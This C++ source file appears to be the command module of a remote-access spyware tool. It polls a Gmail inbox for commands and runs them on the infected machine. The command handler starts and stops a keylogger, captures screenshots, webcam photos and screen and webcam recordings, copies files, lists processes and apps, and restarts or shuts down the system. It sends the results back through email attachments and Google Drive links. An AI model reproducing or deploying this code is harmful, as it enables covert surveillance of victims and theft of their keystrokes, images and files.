#include "../includes/tasks.h"
#include <filesystem>
#include <fstream>
#include <thread>
#include <chrono>
#include <iostream>

namespace fs = std::filesystem;

std::string access_token;
const std::string script_dir = fs::current_path().parent_path().string() + "/scripts/";
const std::string exe_dir = fs::current_path().string() + "/";


bool refreshAccessToken()
{
    int result = system(("python \"" + script_dir + "refresh_token.py\"").c_str());
    if (result != 0)
    {
        std::cerr << "Failed to refresh access token." << std::endl;
        return false;
    }

    std::ifstream in(script_dir + "access_token.txt");
    if (!in.is_open())
    {
        std::cerr << "Failed to open access_token.txt." << std::endl;
        return false;
    }

    std::getline(in, access_token);
    in.close();

    if (access_token.empty())
    {
        std::cerr << "Access token is empty." << std::endl;
        return false;
    }

    std::cout << "Access token refreshed successfully." << std::endl;
    return true;
}

std::string readLastEmailCommand()
{
    int result = system(("python \"" + script_dir + "read_mail.py\"").c_str());
    if (result != 0)
    {
        std::cerr << "Failed to read last email command." << std::endl;
        return "";
    }

    std::ifstream in(script_dir + "last_command.txt");
    if (!in.is_open())
    {
        std::cerr << "Failed to open last command file." << std::endl;
        return "";
    }

    std::string cmd;
    std::getline(in, cmd);
    in.close();

    if (cmd.empty())
    {
        std::cerr << "Last command is empty." << std::endl;
        return "";
    }

    std::cout << "Last command read successfully: " << cmd << std::endl;
    return cmd;
}

bool sendEmail(const std::string& subject, const std::string& body)
{
    std::string tempFile = script_dir + "email_body.txt";
    std::ofstream out(tempFile);
    if (!out.is_open()) 
    {
        std::cerr << "Failed to write email body to file." << std::endl;
        return false;
    }
    out << body;
    out.close();

    std::string command = "python \"" + script_dir + "send_mail.py\" \"" + subject + "\" \"" + tempFile + "\"";
    int result = system(command.c_str());

    return result == 0;
}


bool sendEmailWithAttachment(const std::string& subject, const std::string& body, const std::string& filepath)
{
    std::string command = "python \"" + script_dir + "send_email_with_attachment.py\" \"" + subject + "\" \"" + filepath + "\"";
    int result = system(command.c_str());

    if (result != 0)
    {
        std::cerr << "Failed to send email with attachment." << std::endl;
        return false;
    }

    std::cout << "Email with attachment sent successfully: " << subject << std::endl;
    return true;
}

bool isValidCommand(const std::string& cmd)
{
    static const std::set<std::string> validCommands = {
        "help", "list_services", "start ", "stop ", "list_apps",
        "start_keylogger", "stop_keylogger", "screenshot", "webcam_photo",
        "restart", "shutdown", "start_record", "stop_record", "gmail_server", 
        "copyfile ", "start_webcam_record", "stop_webcam_record"
    };

    for (const auto& validCmd : validCommands)
    {
        if (cmd == validCmd || cmd.rfind(validCmd, 0) == 0) // check prefix
        {
            return true;
        }
    }
    return false;
}

std::string executeCommand(const std::string& cmd)
{
    if (cmd == "help")
    {
        std::string helpMsg = 
            "Available commands:\n"
            "help                                  - Show this help message\n"
            "list_services                     - List all running services\n"
            "start <path>                     - Start a process from given path\n"
            "stop <process_name>     - Stop a process by name\n"
            "list_apps                          - List all visible applications\n"
            "copyfile <source>            - Copy file from source to current directory\n"
            "start_keylogger               - Start keylogger\n"
            "stop_keylogger               - Stop keylogger\n"
            "screenshot                      - Capture screen and save as PNG\n"
            "webcam_photo               - Capture single webcam photo\n"
            "restart                             - Restart the system\n"
            "shutdown                        - Shutdown the system\n"
            "start_record                    - Start screen recording\n"
            "stop_record                    - Stop screen recording\n"
            "start_webcam_record            - Start webcam recording\n"
            "stop_webcam_record             - Stop webcam recording\n";

        return helpMsg;
    }
    else if (cmd == "list_services")
    {
        std::string filename = fs::current_path().string() + "\\process_list.txt";
        std::ofstream out(filename);
        out << listProcesses();
        out.close();
        return filename;
    }
    else if (cmd.rfind("start ", 0) == 0)
    {
        std::string path = cmd.substr(6);
        return startProcess(path) ? "Process started successfully." : "Failed to start process.";
    }
    else if (cmd.rfind("stop ", 0) == 0)
    {
        std::string name = cmd.substr(5);
        return stopProcess(name) ? "Process stopped successfully." : "Failed to stop process.";
    }
    else if (cmd == "list_apps")
    {
        std::string filename = fs::current_path().string() + "\\user_apps.txt";
        std::ofstream out(filename);
        out << listUserApps();
        out.close();
        return filename;
    }
    else if (cmd.rfind("copyfile ", 0) == 0)
    {
        std::string sourcePath = cmd.substr(9);
        std::string destPath = fs::current_path().string() + "\\" + fs::path(sourcePath).filename().string();
        if (copyFile(sourcePath, destPath))
        {
            return destPath;
        }
        else
        {
            return "Failed to copy file.";
        }
    }
    else if (cmd == "start_keylogger")
    {
        startKeylogger();
        return "Keylogger started";
    }
    else if (cmd == "stop_keylogger")
    {
        stopKeylogger();
        std::string filename = fs::current_path().string() + "\\keylog.txt";
        return filename;
    }
    else if (cmd == "screenshot")
    {
        std::string filename = fs::current_path().string() + "\\screenshot.png";
        return captureScreen(filename) ? filename : "Failed to capture screenshot.";
    }
    else if (cmd == "webcam_photo")
    {
        std::string filename = fs::current_path().string() + "\\webcam_photo.jpg";
        return captureWebcamPhoto(filename) ? filename : "Failed to capture webcam photo.";
    }
    else if (cmd == "restart")
    {
        restartSystem();
        return "System is restarting...";
    }
    else if (cmd == "shutdown")
    {
        shutdownSystem();
        return "System is shutting down...";
    }
    else if (cmd == "start_record")
    {
        if (!isRecording())
        {
            std::string filename = fs::current_path().string() + "\\screen_recording.avi";
            startScreenRecording(filename);
            return "Screen recording started.";
        }
        else return "Already recording.";
    }
    else if (cmd == "stop_record")
    {
        if (isRecording())
        {
            stopScreenRecording();
            std::string filename = fs::current_path().string() + "\\screen_recording.avi";
            return filename;
        }
        else return "No recording in progress.";
    }
    else if (cmd == "start_webcam_record")
    {
        if (!isWebcamRecording())
        {
            std::string filename = fs::current_path().string() + "\\webcam_record.avi";
            startWebcamRecording(filename);
            return "Webcam recording started.";
        }
        else return "Webcam recording is already in progress.";
    }
    else if (cmd == "stop_webcam_record")
    {
        if (isWebcamRecording())
        {
            stopWebcamRecording();
            std::string filename = fs::current_path().string() + "\\webcam_record.avi";
            return filename;
        }
        else return "No webcam recording in progress.";
    }

    return "Unknown command: " + cmd;
}

void startGmailControlLoop()
{
    while (true)
    {
        if (!refreshAccessToken())
        {
            std::cerr << "[Gmail] Failed to refresh token." << std::endl;
            std::this_thread::sleep_for(std::chrono::minutes(10));
            continue;
        }

        static std::string last_cmd = "";

        std::string cmd = readLastEmailCommand();
        if (!cmd.empty() && cmd != last_cmd && isValidCommand(cmd))
        {
            last_cmd = cmd;
            std::string response = executeCommand(cmd);

            auto ends_with = [](const std::string& str, const std::string& suffix) {
                return str.size() >= suffix.size() &&
                       str.compare(str.size() - suffix.size(), suffix.size(), suffix) == 0;
            };

            // Check if response is a file path
            if (ends_with(response, ".avi"))
            {
                std::string uploadCmd = "python \"" + script_dir + "upload_to_drive.py\" \"" + response + "\" > \"" + script_dir + "share_link.txt\"";
                int uploadResult = system(uploadCmd.c_str());

                if (uploadResult != 0)
                {
                    sendEmail("Command Response", "Failed to upload video to Google Drive.");
                }
                else
                {
                    std::ifstream linkFile(script_dir + "share_link.txt");
                    std::string shareLink;
                    std::getline(linkFile, shareLink);
                    linkFile.close();

                    if (!shareLink.empty())
                    {
                        std::string driveArg = "drive:" + shareLink;
                        sendEmailWithAttachment("Recorded Video", "Video uploaded to Google Drive.", "drive:" + driveArg);
                    }
                    else
                    {
                        sendEmail("Command Response", "Upload succeeded but failed to read share link.");
                    }
                }
            }
            else if (ends_with(response, ".txt") || ends_with(response, ".png") || ends_with(response, ".jpg") || ends_with(response, ".pdf"))
            {
                if (!sendEmailWithAttachment("Command Response", "See attached file for details.", response))
                {
                    sendEmail("Command Response", "Failed to send file attachment. Response: " + response);
                }
            }
            else
            {
                if (!sendEmail("Command Response", response))
                {
                    sendEmail("Command Response", "Failed to send response. Original command: " + cmd + "\nResponse: " + response);
                }
            }
        }

        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
}
